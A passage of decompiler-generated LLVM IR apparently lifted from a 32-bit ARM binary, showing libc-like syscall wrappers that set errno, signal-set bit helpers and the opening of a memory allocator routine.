  store i32 %v0_12754, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12754, -4095
  br i1 %tmp, label %dec_label_pc_12774, label %dec_label_pc_12764

dec_label_pc_12764:                               ; preds = %dec_label_pc_12748
  %v0_12764 = call i32 @function_1095c()
  %v0_12768 = load i32, i32* %r7.global-to-local, align 4
  %v1_12768 = sub i32 0, %v0_12768
  %v2_1276c = inttoptr i32 %v0_12764 to i32*
  store i32 %v1_12768, i32* %v2_1276c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12774.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12774

dec_label_pc_12774:                               ; preds = %dec_label_pc_12748, %dec_label_pc_12764
  %v1_12778 = phi i32 [ %v0_12754, %dec_label_pc_12748 ], [ -1, %dec_label_pc_12764 ]
  %v2_12774 = phi i32 [ %v3_12748, %dec_label_pc_12748 ], [ %v2_12774.pre, %dec_label_pc_12764 ]
  store i32 %v2_12774, i32* @r7, align 4
  ret i32 %v1_12778

; uselistorder directives
  uselistorder i32 %v0_12754, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12774, { 1, 0 }
}

define i32 @function_12780(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_12780:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_127b4, label %dec_label_pc_127a4

dec_label_pc_127a4:                               ; preds = %dec_label_pc_12780
  %v0_127a4 = call i32 @function_1095c()
  %v0_127a8 = load i32, i32* %r4.global-to-local, align 4
  %v1_127a8 = sub i32 0, %v0_127a8
  %v2_127ac = inttoptr i32 %v0_127a4 to i32*
  store i32 %v1_127a8, i32* %v2_127ac, align 4
  br label %dec_label_pc_127b4

dec_label_pc_127b4:                               ; preds = %dec_label_pc_12780, %dec_label_pc_127a4
  %v1_127bc = phi i32 [ %arg1, %dec_label_pc_12780 ], [ -1, %dec_label_pc_127a4 ]
  ret i32 %v1_127bc

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_127b4, { 1, 0 }
}

define i32 @function_127c4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_127c4:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_127c4 = load i32, i32* @r7, align 4
  store i32 %v3_127c4, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_127ec, label %dec_label_pc_127dc

dec_label_pc_127dc:                               ; preds = %dec_label_pc_127c4
  %v0_127dc = call i32 @function_1095c()
  %v0_127e0 = load i32, i32* %r7.global-to-local, align 4
  %v1_127e0 = sub i32 0, %v0_127e0
  %v2_127e4 = inttoptr i32 %v0_127dc to i32*
  store i32 %v1_127e0, i32* %v2_127e4, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_127f0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_127ec

dec_label_pc_127ec:                               ; preds = %dec_label_pc_127c4, %dec_label_pc_127dc
  %v2_127f0 = phi i32 [ %v3_127c4, %dec_label_pc_127c4 ], [ %v2_127f0.pre, %dec_label_pc_127dc ]
  %v0_127ec = phi i32 [ %arg1, %dec_label_pc_127c4 ], [ -1, %dec_label_pc_127dc ]
  store i32 %v2_127f0, i32* @r7, align 4
  ret i32 %v0_127ec

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_127ec, { 1, 0 }
}

define i32 @function_127fc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_127fc:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_127fc = load i32, i32* @r7, align 4
  store i32 %v3_127fc, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_12824, label %dec_label_pc_12814

dec_label_pc_12814:                               ; preds = %dec_label_pc_127fc
  %v0_12814 = call i32 @function_1095c()
  %v0_12818 = load i32, i32* %r7.global-to-local, align 4
  %v1_12818 = sub i32 0, %v0_12818
  %v2_1281c = inttoptr i32 %v0_12814 to i32*
  store i32 %v1_12818, i32* %v2_1281c, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_12828.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12824

dec_label_pc_12824:                               ; preds = %dec_label_pc_127fc, %dec_label_pc_12814
  %v2_12828 = phi i32 [ %v3_127fc, %dec_label_pc_127fc ], [ %v2_12828.pre, %dec_label_pc_12814 ]
  %v0_12824 = phi i32 [ %arg1, %dec_label_pc_127fc ], [ -1, %dec_label_pc_12814 ]
  store i32 %v2_12828, i32* @r7, align 4
  ret i32 %v0_12824

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12824, { 1, 0 }
}

define i32 @function_12834(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_12834:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_12834 = load i32, i32* @r4, align 4
  store i32 %v3_12834, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_12864, label %dec_label_pc_12854

dec_label_pc_12854:                               ; preds = %dec_label_pc_12834
  %v0_12854 = call i32 @function_1095c()
  %v0_12858 = load i32, i32* %r4.global-to-local, align 4
  %v1_12858 = sub i32 0, %v0_12858
  %v2_1285c = inttoptr i32 %v0_12854 to i32*
  store i32 %v1_12858, i32* %v2_1285c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_12868.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_12864

dec_label_pc_12864:                               ; preds = %dec_label_pc_12834, %dec_label_pc_12854
  %v2_12868 = phi i32 [ %v3_12834, %dec_label_pc_12834 ], [ %v2_12868.pre, %dec_label_pc_12854 ]
  %v0_12864 = phi i32 [ %arg1, %dec_label_pc_12834 ], [ -1, %dec_label_pc_12854 ]
  store i32 %v2_12868, i32* @r4, align 4
  ret i32 %v0_12864

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12864, { 1, 0 }
}

define i32 @function_12874(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_12874:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_128a8, label %dec_label_pc_12898

dec_label_pc_12898:                               ; preds = %dec_label_pc_12874
  %v0_12898 = call i32 @function_1095c()
  %v0_1289c = load i32, i32* %r4.global-to-local, align 4
  %v1_1289c = sub i32 0, %v0_1289c
  %v2_128a0 = inttoptr i32 %v0_12898 to i32*
  store i32 %v1_1289c, i32* %v2_128a0, align 4
  br label %dec_label_pc_128a8

dec_label_pc_128a8:                               ; preds = %dec_label_pc_12874, %dec_label_pc_12898
  %v1_128b0 = phi i32 [ %arg1, %dec_label_pc_12874 ], [ -1, %dec_label_pc_12898 ]
  ret i32 %v1_128b0

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_128a8, { 1, 0 }
}

define i32 @function_128b8(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_128b8:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_128b8 = load i32, i32* @r7, align 4
  store i32 %v3_128b8, i32* %stack_var_-8, align 4
  %v0_128c4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_128c4, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_128c4, -4095
  br i1 %tmp, label %dec_label_pc_128e4, label %dec_label_pc_128d4

dec_label_pc_128d4:                               ; preds = %dec_label_pc_128b8
  %v0_128d4 = call i32 @function_1095c()
  %v0_128d8 = load i32, i32* %r7.global-to-local, align 4
  %v1_128d8 = sub i32 0, %v0_128d8
  %v2_128dc = inttoptr i32 %v0_128d4 to i32*
  store i32 %v1_128d8, i32* %v2_128dc, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_128e4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_128e4

dec_label_pc_128e4:                               ; preds = %dec_label_pc_128b8, %dec_label_pc_128d4
  %v1_128e8 = phi i32 [ %v0_128c4, %dec_label_pc_128b8 ], [ -1, %dec_label_pc_128d4 ]
  %v2_128e4 = phi i32 [ %v3_128b8, %dec_label_pc_128b8 ], [ %v2_128e4.pre, %dec_label_pc_128d4 ]
  store i32 %v2_128e4, i32* @r7, align 4
  ret i32 %v1_128e8

; uselistorder directives
  uselistorder i32 %v0_128c4, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_128e4, { 1, 0 }
}

define i32 @function_128f0(i32 %arg1) local_unnamed_addr {
dec_label_pc_128f0:
  store i32 %arg1, i32* @r0, align 4
  %v3_128f0 = load i32, i32* @r4, align 4
  %v0_128f8 = call i32 @function_10508()
  %v2_12900 = call i32 @function_10670(i32 %v0_128f8, i32 %arg1)
  store i32 %v3_128f0, i32* @r4, align 4
  ret i32 %v2_12900

; uselistorder directives
  uselistorder i32 (i32, i32)* @function_10670, { 0, 2, 1 }
  uselistorder i32 ()* @function_10508, { 0, 3, 2, 1 }
}

define i32 @function_1290c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1290c:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r1, align 4
  %tmp4 = icmp slt i32 %arg1, 1
  br i1 %tmp4, label %dec_label_pc_12924, label %dec_label_pc_1291c

dec_label_pc_1291c:                               ; preds = %dec_label_pc_1290c
  %v7_12920 = icmp slt i32 %arg1, 65
  br i1 %v7_12920, label %dec_label_pc_12938, label %dec_label_pc_12924

dec_label_pc_12924:                               ; preds = %dec_label_pc_1291c, %dec_label_pc_1290c
  %v0_12924 = call i32 @function_1095c()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_12930 = inttoptr i32 %v0_12924 to i32*
  store i32 22, i32* %v2_12930, align 4
  %v0_12940.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12940

dec_label_pc_12938:                               ; preds = %dec_label_pc_1291c
  %v0_12938 = call i32 @function_12a40()
  store i32 %v0_12938, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12940

dec_label_pc_12940:                               ; preds = %dec_label_pc_12924, %dec_label_pc_12938
  %v0_12940 = phi i32 [ %v0_12940.pre, %dec_label_pc_12924 ], [ %v0_12938, %dec_label_pc_12938 ]
  ret i32 %v0_12940

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12940, { 1, 0 }
}

define i32 @function_12950(i32* %arg1) local_unnamed_addr {
dec_label_pc_12950:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_12958 = add i32 %tmp, 4
  %v3_12958 = inttoptr i32 %v2_12958 to i32*
  store i32 0, i32* %v3_12958, align 4
  %v1_1295c = load i32, i32* %r3.global-to-local, align 4
  %v2_1295c = inttoptr i32 %v1_1295c to i32*
  store i32 0, i32* %v2_1295c, align 4
  ret i32 0
}

define i32 @function_12964(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12964:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_12964 = load i32, i32* @r4, align 4
  store i32 %v3_12964, i32* %stack_var_-16, align 4
  %v6_12964 = load i32, i32* @r5, align 4
  %v9_12964 = load i32, i32* @r6, align 4
  %v7_1296c = icmp eq i32 %arg2, -1
  br i1 %v7_1296c, label %.thread4, label %bb

.thread4:                                         ; preds = %dec_label_pc_12964
  br label %.thread16

bb:                                               ; preds = %dec_label_pc_12964
  %v2_12974 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %arg1, i32* @r5, align 4
  %tmp28 = icmp slt i32 %arg1, 1
  br i1 %tmp28, label %.thread16, label %dec_label_pc_12990

.thread16:                                        ; preds = %bb, %.thread4
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12998

dec_label_pc_12990:                               ; preds = %bb
  store i32 0, i32* %r2.global-to-local, align 4
  %v7_12994 = icmp slt i32 %arg1, 65
  br i1 %v7_12994, label %dec_label_pc_129ac, label %dec_label_pc_12998

dec_label_pc_12998:                               ; preds = %.thread16, %dec_label_pc_12990
  %v0_12998 = call i32 @function_1095c()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_129a4 = inttoptr i32 %v0_12998 to i32*
  store i32 22, i32* %v2_129a4, align 4
  %v0_12a04.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb33

dec_label_pc_129ac:                               ; preds = %dec_label_pc_12990
  %v2_129ac = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_129ac, i32* @r4, align 4
  store i32 %arg1, i32* @r1, align 4
  %v2_129b4 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_129b4, i32* @r0, align 4
  store i32 %arg2, i32* %stack_var_-36, align 4
  store i32 0, i32* %stack_var_-24, align 4
  %v0_129c4 = call i32 @function_12a40()
  %v0_129cc = load i32, i32* @r5, align 4
  %v2_129d4 = call i32 @function_12a1c(i32 ptrtoint (i32* @global_var_297cc.268 to i32), i32 %v0_129cc)
  store i32 %v2_12974, i32* %r2.global-to-local, align 4
  %v0_129ec = load i32, i32* @r5, align 4
  %v3_129f4 = call i32 @function_1503c(i32 %v0_129ec, i32 %v2_129ac, i32 %v2_12974)
  %v1_129f8 = icmp slt i32 %v3_129f4, 0
  br i1 %v1_129f8, label %bb32, label %bb31

bb31:                                             ; preds = %dec_label_pc_129ac
  %v5_129fc = load i32, i32* %stack_var_-56, align 4
  store i32 %v5_129fc, i32* %r2.global-to-local, align 4
  br label %bb33

bb32:                                             ; preds = %dec_label_pc_129ac
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %bb33

bb33:                                             ; preds = %bb31, %dec_label_pc_12998, %bb32
  %v0_12a04 = phi i32 [ %v5_129fc, %bb31 ], [ %v0_12a04.pre, %dec_label_pc_12998 ], [ -1, %bb32 ]
  %v2_12a0c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_12a0c, i32* @r4, align 4
  store i32 %v6_12964, i32* @r5, align 4
  store i32 %v9_12964, i32* @r6, align 4
  ret i32 %v0_12a04

; uselistorder directives
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 ()* @function_12a40, { 1, 0 }
  uselistorder i32 65, { 1, 2, 3, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 0, 1 }
  uselistorder label %bb33, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12998, { 1, 0 }
}

define i32 @function_12a1c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12a1c:
  %v1_12a1c = add i32 %arg2, -1
  %v3_12a20 = udiv i32 %v1_12a1c, 32
  %v4_12a24 = mul nuw nsw i32 %v3_12a20, 4
  %v5_12a24 = add i32 %v4_12a24, %arg1
  %v6_12a24 = inttoptr i32 %v5_12a24 to i32*
  %v7_12a24 = load i32, i32* %v6_12a24, align 4
  %v1_12a28 = urem i32 %v1_12a1c, 32
  %v7_12a30 = shl i32 1, %v1_12a28
  %v8_12a30 = and i32 %v7_12a24, %v7_12a30
  %v10_12a30 = icmp ne i32 %v8_12a30, 0
  %. = zext i1 %v10_12a30 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v1_12a1c, { 1, 0 }
}

define i32 @function_12a40() local_unnamed_addr {
dec_label_pc_12a40:
  %v0_12a40 = load i32, i32* @r1, align 4
  %v1_12a40 = add i32 %v0_12a40, -1
  %v3_12a44 = udiv i32 %v1_12a40, 32
  %v0_12a48 = load i32, i32* @r0, align 4
  %v4_12a48 = mul nuw nsw i32 %v3_12a44, 4
  %v5_12a48 = add i32 %v0_12a48, %v4_12a48
  %v6_12a48 = inttoptr i32 %v5_12a48 to i32*
  %v7_12a48 = load i32, i32* %v6_12a48, align 4
  %v1_12a4c = urem i32 %v1_12a40, 32
  %v7_12a54 = shl i32 1, %v1_12a4c
  %v8_12a54 = or i32 %v7_12a48, %v7_12a54
  store i32 %v8_12a54, i32* %v6_12a48, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_12a40, { 1, 0 }
}

define i32 @function_12a64(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12a64:
  %v1_12a64 = add i32 %arg2, -1
  %v3_12a68 = udiv i32 %v1_12a64, 32
  %v4_12a6c = mul nuw nsw i32 %v3_12a68, 4
  %v5_12a6c = add i32 %v4_12a6c, %arg1
  %v6_12a6c = inttoptr i32 %v5_12a6c to i32*
  %v7_12a6c = load i32, i32* %v6_12a6c, align 4
  %v1_12a70 = urem i32 %v1_12a64, 32
  %tmp = shl i32 -1, %v1_12a70
  %v8_12a78 = add i32 %tmp, -1
  %v9_12a78 = and i32 %v7_12a6c, %v8_12a78
  store i32 %v9_12a78, i32* %v6_12a6c, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_12a64, { 1, 0 }
}

define i32 @function_12a88(i32 %arg1) local_unnamed_addr {
dec_label_pc_12a88:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v3_12a88 = udiv i32 %arg1, 256
  store i32 %v3_12a88, i32* %r1.global-to-local, align 4
  %v2_12a8c = icmp ugt i32 %arg1, 16777215
  store i32 %arg1, i32* %ip.global-to-local, align 4
  br i1 %v2_12a8c, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_12a88
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_12a88, %bb
  %v0_12a98 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_12a8c, i32 %v0_12a98)
  %v0_12a9c = load i32, i32* %r1.global-to-local, align 4
  %v1_12a9c = add i32 %v0_12a9c, 1048320
  %v3_12aa0 = udiv i32 %v1_12a9c, 65536
  %v1_12aa4 = and i32 %v3_12aa0, 8
  %v6_12aa8 = shl i32 %v0_12a9c, %v1_12aa4
  %v1_12aac = add i32 %v6_12aa8, 520192
  %v3_12ab0 = udiv i32 %v1_12aac, 65536
  %v1_12ab4 = and i32 %v3_12ab0, 4
  %v6_12ab8 = shl i32 %v6_12aa8, %v1_12ab4
  %v1_12abc = add i32 %v6_12ab8, 245760
  %v3_12ac0 = udiv i32 %v1_12abc, 65536
  %v1_12ac4 = and i32 %v3_12ac0, 2
  %v6_12ac8 = shl i32 %v6_12ab8, %v1_12ac4
  store i32 %v6_12ac8, i32* %r1.global-to-local, align 4
  %v1_12acc = sub nsw i32 13, %v1_12aa4
  %v2_12ad0 = sub nsw i32 %v1_12acc, %v1_12ab4
  %v3_12ad4 = udiv i32 %v6_12ac8, 32768
  %v4_12ad4 = sub nuw nsw i32 -1, %v3_12ad4
  %v4_12ad8 = udiv i32 %v6_12ac8, 16384
  %v5_12ad8 = and i32 %v4_12ad8, %v4_12ad4
  %v2_12adc = sub nsw i32 %v2_12ad0, %v1_12ac4
  %v2_12ae0 = add nsw i32 %v2_12adc, %v5_12ad8
  %v1_12ae4 = add nsw i32 %v2_12ae0, 6
  %v0_12ae8 = load i32, i32* %ip.global-to-local, align 4
  %v6_12ae8 = lshr i32 %v0_12ae8, %v1_12ae4
  %v3_12aec = mul nsw i32 %v2_12ae0, 4
  %v1_12af0 = add nsw i32 %v3_12aec, 32
  %v1_12af4 = urem i32 %v6_12ae8, 4
  %v2_12af8 = or i32 %v1_12af4, %v1_12af0
  ret i32 %v2_12af8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @function_12b00(i32 %arg1) local_unnamed_addr {
dec_label_pc_12b00:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_12b00 = load i32, i32* @r4, align 4
  %v6_12b00 = load i32, i32* @r5, align 4
  %v9_12b00 = load i32, i32* @r6, align 4
  %v12_12b00 = load i32, i32* @r7, align 4
  %v15_12b00 = load i32, i32* @r8, align 4
  %v18_12b00 = load i32, i32* @sb, align 4
  %v21_12b00 = load i32, i32* @sl, align 4
  %v24_12b00 = load i32, i32* @fp, align 4
  %v27_12b00 = load i32, i32* @lr, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  store i32 144312, i32* %r1.global-to-local, align 4
  %v4_12b14 = load i32, i32* inttoptr (i32 144384 to i32*), align 1024
  store i32 %v4_12b14, i32* %r4.global-to-local, align 4
  store i32 40, i32* %r3.global-to-local, align 4
  %v4_12b20 = load i32, i32* inttoptr (i32 144352 to i32*), align 32
  store i32 %v4_12b20, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %v4_12b14, i32* %r2.global-to-local, align 4
  %v2_12b2c = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_12b2c, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  store i32 144312, i32* %ip.global-to-local, align 4
  %v4_12b38 = load i32, i32* inttoptr (i32 144388 to i32*), align 4
  store i32 %v4_12b38, i32* %ip.global-to-local, align 4
  store i32 76612, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_12b38)
  %v0_12b44 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_12b44, i32* %r0.global-to-local, align 4
  store i32 20, i32* %r3.global-to-local, align 4
  store i32 144312, i32* %r1.global-to-local, align 4
  %v4_12b50 = load i32, i32* inttoptr (i32 144332 to i32*), align 4
  store i32 %v4_12b50, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_12b5c.274 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_12b50)
  %v0_12b5c = load i32, i32* @r5, align 4
  %tmp = icmp ult i32 %v0_12b5c, -32
  br i1 %tmp, label %dec_label_pc_12b78, label %dec_label_pc_12b64

dec_label_pc_12b64:                               ; preds = %dec_label_pc_12b00
  %v0_12b64 = call i32 @function_1095c()
  store i32 %v0_12b64, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 12, i32* @r3, align 4
  %v2_12b70 = inttoptr i32 %v0_12b64 to i32*
  store i32 12, i32* %v2_12b70, align 4
  br label %dec_label_pc_133f4

dec_label_pc_12b78:                               ; preds = %dec_label_pc_12b00
  %v1_12b78 = add i32 %v0_12b5c, 11
  store i32 %v1_12b78, i32* %r0.global-to-local, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 144312, i32* %r2.global-to-local, align 4
  %v2_12b84 = icmp ugt i32 %v1_12b78, 14
  %v7_12b84 = icmp eq i32 %v1_12b78, 15
  %v2_12b88 = xor i1 %v7_12b84, true
  %v3_12b88 = and i1 %v2_12b84, %v2_12b88
  br i1 %v3_12b88, label %bb, label %bb138

bb:                                               ; preds = %dec_label_pc_12b78
  %v5_12b88 = and i32 %v1_12b78, -8
  store i32 %v5_12b88, i32* @sl, align 4
  br label %bb138

bb138:                                            ; preds = %dec_label_pc_12b78, %bb
  %v4_12b8c = load i32, i32* inttoptr (i32 144348 to i32*), align 4
  store i32 %v4_12b8c, i32* @r0, align 4
  %v1_12b90 = inttoptr i32 %v4_12b8c to i32*
  %v2_12b90 = load i32, i32* %v1_12b90, align 4
  store i32 %v2_12b90, i32* @r4, align 4
  %v2_12b94 = xor i1 %v2_12b84, true
  %v3_12b94 = or i1 %v7_12b84, %v2_12b94
  br i1 %v3_12b94, label %bb139, label %bb140

bb139:                                            ; preds = %bb138
  store i32 16, i32* @sl, align 4
  br label %bb140

bb140:                                            ; preds = %bb138, %bb139
  %v1_12b98 = urem i32 %v2_12b90, 2
  %v2_12b98 = icmp eq i32 %v1_12b98, 0
  br i1 %v2_12b98, label %dec_label_pc_12ba0, label %dec_label_pc_12bb0

dec_label_pc_12ba0:                               ; preds = %bb140
  %v2_12ba0 = icmp eq i32 %v2_12b90, 0
  br i1 %v2_12ba0, label %dec_label_pc_12ba8, label %dec_label_pc_12f8c

dec_label_pc_12ba8:                               ; preds = %dec_label_pc_12ba0
  %v0_12ba8 = call i32 @function_134d0()
  store i32 %v0_12ba8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12f8c

dec_label_pc_12bb0:                               ; preds = %bb140
  %v0_12bb0 = load i32, i32* @sl, align 4
  %tmp201 = icmp ugt i32 %v0_12bb0, %v2_12b90
  br i1 %tmp201, label %dec_label_pc_12bd8, label %dec_label_pc_12bb8

dec_label_pc_12bb8:                               ; preds = %dec_label_pc_12bb0
  %v1_12bb8 = add i32 %v4_12b8c, -4
  store i32 %v1_12bb8, i32* %r1.global-to-local, align 4
  %v3_12bbc = udiv i32 %v0_12bb0, 8
  store i32 %v3_12bbc, i32* %r2.global-to-local, align 4
  %v4_12bc0 = mul nuw i32 %v3_12bbc, 4
  %v5_12bc0 = add i32 %v4_12bc0, %v1_12bb8
  %v6_12bc0 = inttoptr i32 %v5_12bc0 to i32*
  %v7_12bc0 = load i32, i32* %v6_12bc0, align 4
  store i32 %v7_12bc0, i32* %r0.global-to-local, align 4
  %v2_12bc4 = icmp eq i32 %v7_12bc0, 0
  br i1 %v2_12bc4, label %dec_label_pc_12bd8, label %.thread1

.thread1:                                         ; preds = %dec_label_pc_12bb8
  %v2_12bc8 = add i32 %v7_12bc0, 8
  %v3_12bc8 = inttoptr i32 %v2_12bc8 to i32*
  %v4_12bc8 = load i32, i32* %v3_12bc8, align 4
  store i32 %v4_12bc8, i32* %r3.global-to-local, align 4
  store i32 %v2_12bc8, i32* %r0.global-to-local, align 4
  store i32 %v2_12bc8, i32* %r4.global-to-local, align 4
  store i32 %v4_12bc8, i32* %v6_12bc0, align 4
  br label %dec_label_pc_133d8

dec_label_pc_12bd8:                               ; preds = %dec_label_pc_12bb8, %dec_label_pc_12bb0
  %tmp202 = icmp ugt i32 %v0_12bb0, 255
  br i1 %tmp202, label %dec_label_pc_12c28, label %dec_label_pc_12be0

dec_label_pc_12be0:                               ; preds = %dec_label_pc_12bd8
  store i32 144312, i32* %ip.global-to-local, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  %v4_12be8 = load i32, i32* inttoptr (i32 144348 to i32*), align 4
  %v3_12bec = udiv i32 %v0_12bb0, 8
  store i32 %v3_12bec, i32* @r7, align 4
  %v4_12bf0 = mul nuw i32 %v3_12bec, 8
  %v5_12bf0 = add i32 %v4_12be8, %v4_12bf0
  store i32 %v5_12bf0, i32* %r3.global-to-local, align 4
  %v1_12bf4 = add i32 %v5_12bf0, 44
  store i32 %v1_12bf4, i32* %ip.global-to-local, align 4
  %v1_12bf8 = add i32 %v5_12bf0, 56
  %v2_12bf8 = inttoptr i32 %v1_12bf8 to i32*
  %v3_12bf8 = load i32, i32* %v2_12bf8, align 4
  store i32 %v3_12bf8, i32* %r0.global-to-local, align 4
  %v9_12bfc = icmp eq i32 %v3_12bf8, %v1_12bf4
  br i1 %v9_12bfc, label %dec_label_pc_12d88, label %dec_label_pc_12c04

dec_label_pc_12c04:                               ; preds = %dec_label_pc_12be0
  %v2_12c04 = add i32 %v3_12bf8, %v0_12bb0
  store i32 %v2_12c04, i32* %r3.global-to-local, align 4
  %v1_12c08 = add i32 %v2_12c04, 4
  %v2_12c08 = inttoptr i32 %v1_12c08 to i32*
  %v3_12c08 = load i32, i32* %v2_12c08, align 4
  store i32 %v3_12c08, i32* %r2.global-to-local, align 4
  %v1_12c0c = add i32 %v3_12bf8, 12
  %v2_12c0c = inttoptr i32 %v1_12c0c to i32*
  %v3_12c0c = load i32, i32* %v2_12c0c, align 4
  store i32 %v3_12c0c, i32* %r1.global-to-local, align 4
  %v1_12c10 = or i32 %v3_12c08, 1
  store i32 %v1_12c10, i32* %r2.global-to-local, align 4
  %v1_12c14 = add i32 %v3_12bf8, 8
  store i32 %v1_12c14, i32* %r4.global-to-local, align 4
  store i32 %v1_12c10, i32* %v2_12c08, align 4
  %v0_12c1c = load i32, i32* %ip.global-to-local, align 4
  %v1_12c1c = load i32, i32* %r1.global-to-local, align 4
